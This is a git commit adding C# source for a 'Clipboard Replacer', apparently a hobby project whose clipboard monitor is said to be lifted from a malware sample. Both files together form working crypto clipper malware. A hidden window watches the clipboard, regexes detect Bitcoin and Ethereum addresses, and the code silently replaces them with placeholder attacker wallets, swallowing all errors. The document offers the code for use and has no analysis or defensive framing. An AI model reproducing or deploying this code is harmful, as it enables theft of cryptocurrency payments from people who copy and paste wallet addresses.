aef2d60cea9dc60890188b1750cef65793b3ff07
DavidTheTech <david95654@googlemail.com>
2020-12-03 02:10:21 +0000

    Add files via upload

---
+++ ClipboardReplacer (Day 3)/ClipboardReplacer/ClipMon.cs
@@ -0,0 +1,152 @@
+﻿/*
+ * This was taken from a random malware found in my todo reverse folder
+ * Contact me on twitter at @DavidTheTechMTI for the sample
+*/
+
+using System;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace ClipboardReplacer
+{
+    public enum Clipform : byte
+    {
+        Text,
+        UnicodeText,
+        Dib,
+        Bitmap,
+        EnhancedMetafile,
+        MetafilePict,
+        SymbolicLink,
+        Dif,
+        Tiff,
+        OemText,
+        Palette,
+        PenData,
+        Riff,
+        WaveAudio,
+        FileDrop,
+        Locale,
+        Html,
+        Rtf,
+        CommaSeparatedValue,
+        StringFormat,
+        Serializable
+    }
+
+    public static class ClipMon
+    {
+        public static event OnClipboardChangeEventHandler OnClipboardChange;
+
+        public delegate void OnClipboardChangeEventHandler(Clipform format, object data);
+
+        public static void Start()
+        {
+            Clipwatch.Start();
+            Clipwatch.OnClipboardChange += delegate(Clipform format, object data)
+            {
+                OnClipboardChange(format, data);
+            };
+        }
+
+        public static void Stop()
+        {
+            OnClipboardChange = null;
+            Clipwatch.Stop();
+        }
+
+        private class Clipwatch : Form
+        {
+            public static event Clipwatch.OnClipboardChangeEventHandler OnClipboardChange;
+            private const int WM_DRAWCLIPBOARD = 776;
+            private const int WM_CHANGECBCHAIN = 781;
+            private static Clipwatch mInstance;
+            private static IntPtr nextClipboardViewer;
+            private static readonly string[] formats = Enum.GetNames(typeof(Clipform));
+            public delegate void OnClipboardChangeEventHandler(Clipform format, object data);
+
+            [DllImport("User32.dll", CharSet = CharSet.Auto)]
+            private static extern IntPtr SetClipboardViewer(IntPtr hWndNewViewer);
+            [DllImport("User32.dll", CharSet = CharSet.Auto)]
+            private static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);
+            [DllImport("user32.dll", CharSet = CharSet.Auto)]
+            private static extern int SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, IntPtr lParam);
+
+            public static void Start()
+            {
+                if (Clipwatch.mInstance != null)
+                {
+                    return;
+                }
+                Thread thread = new Thread(delegate(object x)
+                {
+                    Application.Run(new Clipwatch());
+                });
+                thread.SetApartmentState(ApartmentState.STA);
+                thread.Start();
+            }
+
+            public static void Stop()
+            {
+                Clipwatch.mInstance.Invoke(new MethodInvoker(delegate()
+                {
+                    Clipwatch.ChangeClipboardChain(Clipwatch.mInstance.Handle, Clipwatch.nextClipboardViewer);
+                }));
+                Clipwatch.mInstance.Invoke(new MethodInvoker(Clipwatch.mInstance.Close));
+                Clipwatch.mInstance.Dispose();
+                Clipwatch.mInstance = null;
+            }
+
+            protected override void SetVisibleCore(bool value)
+            {
+                this.CreateHandle();
+                Clipwatch.mInstance = this;
+                Clipwatch.nextClipboardViewer = Clipwatch.SetClipboardViewer(Clipwatch.mInstance.Handle);
+                base.SetVisibleCore(false);
+            }
+
+            protected override void WndProc(ref Message m)
+            {
+                int msg = m.Msg;
+                if (msg == 776)
+                {
+                    this.ClipChang();
+                    Clipwatch.SendMessage(Clipwatch.nextClipboardViewer, m.Msg, m.WParam, m.LParam);
+                    return;
+                }
+                if (msg != 781)
+                {
+                    base.WndProc(ref m);
+                    return;
+                }
+                if (m.WParam == Clipwatch.nextClipboardViewer)
+                {
+                    Clipwatch.nextClipboardViewer = m.LParam;
+                    return;
+                }
+                Clipwatch.SendMessage(Clipwatch.nextClipboardViewer, m.Msg, m.WParam, m.LParam);
+            }
+
+            private void ClipChang()
+            {
+                IDataObject dataObject = Clipboard.GetDataObject();
+                Clipform ? clipform = null;
+                foreach (string text in Clipwatch.formats)
+                {
+                    if (dataObject.GetDataPresent(text))
+                    {
+                        clipform = new Clipform?((Clipform)Enum.Parse(typeof(Clipform), text));
+                        break;
+                    }
+                }
+                object data = dataObject.GetData(clipform.ToString());
+                if (data == null || clipform == null)
+                {
+                    return;
+                }
+                Clipwatch.OnClipboardChange(clipform.Value, data);
+            }
+        }
+    }
+}
---
+++ ClipboardReplacer (Day 3)/ClipboardReplacer/Program.cs
@@ -0,0 +1,58 @@
+﻿/*
+ * 31 Days of XMAS projects (Day 3)
+ * 
+ * Clipboard Replacer by DavidTheTech
+ * This will regex certain strings and replace then
+*/
+
+using System.Text.RegularExpressions;
+using System.Windows.Forms;
+
+namespace ClipboardReplacer
+{
+    class Program
+    {
+        private static string ETHEREUM = "put eth wallet here";
+        private static string BTC = "put btc wallet here";
+
+        static void Main(string[] args)
+        {
+            try
+            {
+                ClipMon.OnClipboardChange += Checker;
+                ClipMon.Start();
+            }
+            catch
+            {
+            }
+        }
+
+        private static void Checker(Clipform format, object data)
+        {
+            try
+            {
+                string text = Clipboard.GetText();
+                /*old regex (^(1|3)(?=.*[0-9])(?=.*[a-zA-Z])[\\da-zA-Z]{27,34}?[\\d\\- ])|(^(1|3)(?=.*[0-9])(?=.*[a-zA-Z])[\\da-zA-Z]{27,34})$
+                 * Wouldn't work for addresses beginning with bc1
+                 * removed (1|3) and it seems to work
+                 * not the best solution breaks when the address contains anything other than the address alone
+                */
+
+                Regex BTCRegex = new Regex("(^(?=.*[0-9])(?=.*[a-zA-Z])[\\da-zA-Z]{27,34}?[\\d\\- ])|(^(1|3)(?=.*[0-9])(?=.*[a-zA-Z])[\\da-zA-Z]{27,34})$");
+                Regex ETHRegex = new Regex("(^0x[A-Za-z0-9]{40,40}?[\\d\\- ])|(^0x[A-Za-z0-9]{40,40})$");
+                
+                if (BTC != null && BTCRegex.IsMatch(text))
+                {
+                    Clipboard.SetText(BTC);
+                }
+                if (ETHEREUM != null && ETHRegex.IsMatch(text))
+                {
+                    Clipboard.SetText(ETHEREUM);
+                }
+            }
+            catch
+            {
+            }
+        }
+    }
+}
